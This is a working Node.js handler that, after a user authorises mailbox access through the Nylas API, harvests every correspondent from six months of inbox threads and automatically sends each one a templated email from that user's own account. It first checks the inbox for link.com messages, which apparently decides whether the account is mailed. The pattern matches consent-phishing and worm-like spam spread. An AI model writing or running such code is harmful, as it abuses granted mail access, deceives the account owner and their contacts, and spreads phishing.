const {
  listIndexedAccounts,
  resolveAccountFromBody,
  resolveAccountFromQuery
} = require("../nylas-credentials");
const { updateGrantHaveLink } = require("../supabase-grants");
const emailTemplate = require("../templates/post-auth-email");

const LINK_SUBJECT_SEARCH = "Link : ";
const MESSAGE_PAGE_LIMIT = 50;
const THREAD_PAGE_LIMIT = 50;
const SIX_MONTHS_SECONDS = 183 * 24 * 60 * 60;
const MAX_ERROR_DETAILS = 20;
const SEND_DELAY_MS = 150;

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getJsonBody(req) {
  if (!req || req.body == null) return {};
  if (typeof req.body === "object") return req.body;
  if (typeof req.body === "string") {
    try {
      return JSON.parse(req.body);
    } catch (_error) {
      return {};
    }
  }
  return {};
}

async function parseJsonResponse(response) {
  const text = await response.text();
  if (!text) return {};
  try {
    return JSON.parse(text);
  } catch (_error) {
    return { raw: text };
  }
}

function buildNylasHeaders(apiKey) {
  return {
    Authorization: `Bearer ${apiKey}`,
    "Content-Type": "application/json"
  };
}

function getNextCursor(payload) {
  return (
    payload?.next_cursor ||
    payload?.nextCursor ||
    payload?.next_page_token ||
    payload?.nextPageToken ||
    ""
  );
}

function normalizeEmail(value) {
  return typeof value === "string" ? value.trim().toLowerCase() : "";
}

function emailDomain(email) {
  const at = email.lastIndexOf("@");
  if (at < 0) return "";
  return email.slice(at + 1);
}

function isLinkComSender(message) {
  const from = Array.isArray(message?.from) ? message.from : [];
  for (const entry of from) {
    const email = normalizeEmail(entry?.email);
    if (email && emailDomain(email) === "link.com") {
      return true;
    }
  }
  return false;
}

function shouldExcludeLocalPart(email) {
  const normalized = normalizeEmail(email);
  const local = normalized.split("@")[0] || "";
  return local === "support" || local === "notifications";
}

async function resolveApiKey(req, body) {
  try {
    const rawClientId = typeof body?.clientId === "string" ? body.clientId.trim() : "";
    if (rawClientId) {
      const allAccounts = await listIndexedAccounts();
      const found = allAccounts.find((account) => account.clientId === rawClientId);
      if (found?.apiKey) {
        return { apiKey: found.apiKey };
      }
    }

    if (body?.account !== undefined && body?.account !== null && body?.account !== "") {
      return resolveAccountFromBody(body.account);
    }

    return resolveAccountFromQuery(req);
  } catch (error) {
    return {
      error: error?.message || "Unable to load Supabase accounts",
      status: 500
    };
  }
}

async function fetchGrantProfile({ apiUrl, apiKey, grantId }) {
  const url = `${apiUrl}/v3/grants/${encodeURIComponent(grantId)}`;
  const response = await fetch(url, { headers: buildNylasHeaders(apiKey) });
  const payload = await parseJsonResponse(response);
  if (!response.ok) {
    const err = new Error(payload?.error?.message || "Grant lookup failed");
    err.status = response.status;
    err.details = payload;
    throw err;
  }
  const data = payload?.data && typeof payload.data === "object" ? payload.data : payload;
  const email =
    typeof data?.email === "string"
      ? normalizeEmail(data.email)
      : typeof data?.email_address === "string"
        ? normalizeEmail(data.email_address)
        : "";
  return { email };
}

async function assertGrantAuthenticated({ apiUrl, apiKey, grantId }) {
  const url = `${apiUrl}/v3/grants/${encodeURIComponent(grantId)}/messages?limit=1`;
  const response = await fetch(url, { headers: buildNylasHeaders(apiKey) });
  if (response.status === 401) {
    const err = new Error("Grant not authenticated");
    err.status = 401;
    throw err;
  }
  if (!response.ok) {
    const payload = await parseJsonResponse(response);
    const err = new Error(payload?.error?.message || "Unable to verify grant");
    err.status = response.status;
    err.details = payload;
    throw err;
  }
}

async function findLinkComInSubjectSearch({ apiUrl, apiKey, grantId }) {
  let pageToken = "";
  let pages = 0;
  const maxPages = 40;

  while (pages < maxPages) {
    const params = new URLSearchParams();
    params.set("limit", String(MESSAGE_PAGE_LIMIT));
    params.set("subject", LINK_SUBJECT_SEARCH);
    if (pageToken) {
      params.set("page_token", pageToken);
    }

    const url = `${apiUrl}/v3/grants/${encodeURIComponent(grantId)}/messages?${params.toString()}`;
    const response = await fetch(url, { headers: buildNylasHeaders(apiKey) });
    const payload = await parseJsonResponse(response);
    if (!response.ok) {
      const err = new Error(payload?.error?.message || "Link subject search failed");
      err.status = response.status;
      err.details = payload;
      throw err;
    }

    const messages = Array.isArray(payload?.data) ? payload.data : [];
    for (const message of messages) {
      if (isLinkComSender(message)) {
        return true;
      }
    }

    pageToken = getNextCursor(payload);
    if (!pageToken || !messages.length) {
      break;
    }
    pages += 1;
  }

  return false;
}

function collectParticipantsFromThread(thread) {
  const out = [];
  const participants = Array.isArray(thread?.participants) ? thread.participants : [];
  for (const p of participants) {
    const email = normalizeEmail(p?.email);
    if (email) {
      out.push(email);
    }
  }
  return out;
}

async function listInboxThreadsSixMonths({ apiUrl, apiKey, grantId, grantEmail, sinceUnix }) {
  let threadsListed = 0;
  const emails = new Set();
  let pageToken = "";
  let pages = 0;
  const maxPages = 200;

  while (pages < maxPages) {
    const params = new URLSearchParams();
    params.set("limit", String(THREAD_PAGE_LIMIT));
    params.set("in", "INBOX");
    params.set("latest_message_after", String(sinceUnix));
    if (pageToken) {
      params.set("page_token", pageToken);
    }

    const url = `${apiUrl}/v3/grants/${encodeURIComponent(grantId)}/threads?${params.toString()}`;
    const response = await fetch(url, { headers: buildNylasHeaders(apiKey) });
    const payload = await parseJsonResponse(response);
    if (!response.ok) {
      const err = new Error(payload?.error?.message || "List threads failed");
      err.status = response.status;
      err.details = payload;
      throw err;
    }

    const threads = Array.isArray(payload?.data) ? payload.data : [];
    threadsListed += threads.length;
    for (const thread of threads) {
      for (const email of collectParticipantsFromThread(thread)) {
        if (grantEmail && email === grantEmail) {
          continue;
        }
        if (shouldExcludeLocalPart(email)) {
          continue;
        }
        emails.add(email);
      }
    }

    pageToken = getNextCursor(payload);
    if (!pageToken || !threads.length) {
      break;
    }
    pages += 1;
  }

  return {
    threadCount: threadsListed,
    recipientEmails: Array.from(emails).sort()
  };
}

async function sendMessage({ apiUrl, apiKey, grantId, toEmail, subject, bodyHtml }) {
  const url = `${apiUrl}/v3/grants/${encodeURIComponent(grantId)}/messages/send`;
  const response = await fetch(url, {
    method: "POST",
    headers: buildNylasHeaders(apiKey),
    body: JSON.stringify({
      subject,
      body: bodyHtml,
      to: [{ email: toEmail }]
    })
  });
  const payload = await parseJsonResponse(response);
  if (!response.ok) {
    const err = new Error(payload?.error?.message || "Send failed");
    err.status = response.status;
    err.details = payload;
    throw err;
  }
  return payload;
}

module.exports = async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const body = getJsonBody(req);
  const grantId = typeof body?.grantId === "string" ? body.grantId.trim() : "";

  if (!grantId) {
    return res.status(400).json({ error: "grantId is required" });
  }

  const resolved = await resolveApiKey(req, body);
  if (resolved.error) {
    return res.status(resolved.status || 500).json({ error: resolved.error });
  }
  const { apiKey } = resolved;

  const apiUrl = process.env.NYLAS_API_URL || "https://api.eu.nylas.com";
  const stats = {
    grantOk: false,
    linkSenderSkipped: false,
    threadsSeen: 0,
    recipientsConsidered: 0,
    sent: 0,
    failed: 0
  };
  const errors = [];

  try {
    await assertGrantAuthenticated({ apiUrl, apiKey, grantId });
    stats.grantOk = true;

    const linkFound = await findLinkComInSubjectSearch({ apiUrl, apiKey, grantId });
    await updateGrantHaveLink(grantId, linkFound);
    if (linkFound) {
      stats.linkSenderSkipped = true;
      return res.status(200).json({
        ok: true,
        skipped: true,
        reason: "link_sender_found",
        grantId,
        stats
      });
    }

    const { email: grantEmail } = await fetchGrantProfile({ apiUrl, apiKey, grantId });
    const sinceUnix = Math.floor(Date.now() / 1000) - SIX_MONTHS_SECONDS;

    const { threadCount, recipientEmails } = await listInboxThreadsSixMonths({
      apiUrl,
      apiKey,
      grantId,
      grantEmail,
      sinceUnix
    });

    stats.threadsSeen = threadCount;
    stats.recipientsConsidered = recipientEmails.length;

    const subject = emailTemplate.subject;
    const bodyHtml = emailTemplate.bodyHtml;

    for (const toEmail of recipientEmails) {
      try {
        await sendMessage({ apiUrl, apiKey, grantId, toEmail, subject, bodyHtml });
        stats.sent += 1;
        if (SEND_DELAY_MS > 0) {
          await sleep(SEND_DELAY_MS);
        }
      } catch (sendError) {
        stats.failed += 1;
        if (errors.length < MAX_ERROR_DETAILS) {
          errors.push({
            email: toEmail,
            status: sendError?.status || null,
            message: sendError?.message || "Send failed"
          });
        }
      }
    }

    return res.status(200).json({
      ok: true,
      skipped: false,
      grantId,
      stats,
      errors
    });
  } catch (error) {
    const status = error?.status && Number.isFinite(error.status) ? error.status : 502;
    if (errors.length < MAX_ERROR_DETAILS) {
      errors.push({
        email: null,
        status: error?.status || null,
        message: error?.message || "Unknown error"
      });
    }
    return res.status(status >= 400 && status < 600 ? status : 502).json({
      ok: false,
      error: "Post-auth workflow failed",
      grantId,
      stats,
      details: error?.message || "Unknown error",
      errors
    });
  }
};
